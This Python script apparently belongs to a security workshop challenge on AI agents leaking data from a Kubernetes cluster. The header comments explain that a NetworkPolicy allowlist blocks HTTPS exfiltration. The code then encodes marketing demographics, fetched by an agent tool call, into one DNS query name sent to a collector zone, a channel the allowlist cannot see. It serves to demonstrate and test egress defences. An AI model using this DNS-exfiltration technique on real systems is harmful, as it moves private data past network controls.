# ABOUTME: C1 stage-2b (DNS): the in-image Python name-lookup form of the beat. It carries the marketing
# ABOUTME: demographics out of the cluster as a DNS query name, the one door the L3/L4 egress allowlist cannot see.
#
# Why this file exists. C1 part 2 (fallback.kubectl.sh) sends the intel over HTTPS with curl, and the
# agent-egress-allowlist NetworkPolicy holds that send: it matches addresses and ports, and an HTTPS POST to a
# public IP is denied. A DNS query is a different shape. agent-allow-dns.yaml opens UDP and TCP 53 to kube-system
# so the pods resolve Bedrock and in-cluster service names; CoreDNS forwards a name it does not serve to an
# upstream resolver, which walks to whichever authoritative server owns the zone. A query NAME is not an address
# or a port, so the allowlist never sees the data riding in it. That is the stage-2b beat: the same ask as stage
# 2, over a door the policy does not watch. The fix an FQDN-aware control adds is tracked separately (#724, #727).
#
# Altitude. This is the defensive, educational twin of the curl beat, not a tunnelling tool. It emits ONE
# representative lookup carrying the demographic shares (the room-view payload, "how many customers are humans
# versus vampires"), the way the curl beat POSTs the intel once. It adds NO encoder, NO label chunking and NO new
# binary: python:3.12-slim already ships the stdlib socket resolver, so images/workshop-mcp/Dockerfile stays curl
# and ca-certificates only. The exfil is the query LEAVING the pod; whether the collector hands back a routable
# address does not matter, so a name that does not resolve (NXDOMAIN, or no address) is still a send that landed,
# the way a curl whose body the beacon accepts is, however it answers.
#
# Usage. This is the payload the owed live check pipes into the workshop-mcp pod (parallel to
# challenges/c1-exfil-s3/fallback.kubectl.sh, named under verify/run-e2e.sh and tracked by #728). The agent calls
# get_marketing_intel first, as in stage 2, and its JSON arrives on stdin:
#   python3 dns-exfil.py <collector-zone> [<marker>]   # marketing JSON on stdin
# It builds one query name <marker>.<compact-demographics>.<collector-zone> and looks it up with the in-image
# stdlib resolver, then prints the name it sent so the live check can match it against the DNS collector's view.

import json
import socket
import sys


def demographics_label(marketing: dict) -> str:
    """A compact, DNS-label-safe summary of the demographic shares: the room-view payload the beat leaks.

    Two letters of the species name plus its share percent, e.g. humans 41% -> hu41, joined into one label.
    The shares are a handful of small integers, so the whole summary sits well under the 63-byte label limit and
    no chunking is needed. Letters and digits only, lower-cased, so the result is a valid DNS label.
    """
    demo = marketing.get("demographics") or {}
    parts = [f"{name[:2]}{seg.get('share_pct', 0)}" for name, seg in demo.items()
             if isinstance(seg, dict)]
    label = "".join(parts).lower()
    return "".join(c for c in label if c.isalnum()) or "none"


def query_name(zone: str, marker: str, marketing: dict) -> str:
    """The single query name the beat looks up: <marker>.<demographics>.<collector-zone>."""
    return ".".join([marker, demographics_label(marketing), zone.strip(".")])


def send(zone: str, marker: str, marketing: dict) -> str:
    """Look the name up through the pod's stdlib resolver and return it. The send is the query leaving the pod, so
    a name the collector does not resolve to an address (gaierror) still landed and is returned as sent."""
    name = query_name(zone, marker, marketing)
    try:
        socket.getaddrinfo(name, None)
    except socket.gaierror:
        pass
    return name


def main(argv: list) -> int:
    if len(argv) < 2:
        print("usage: dns-exfil.py <collector-zone> [<marker>]  (marketing JSON on stdin)", file=sys.stderr)
        return 2
    zone = argv[1]
    marker = argv[2] if len(argv) > 2 else "wib"
    raw = sys.stdin.read()
    try:
        marketing = json.loads(raw) if raw.strip() else {}
    except ValueError:
        marketing = {}
    print(send(zone, marker, marketing))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
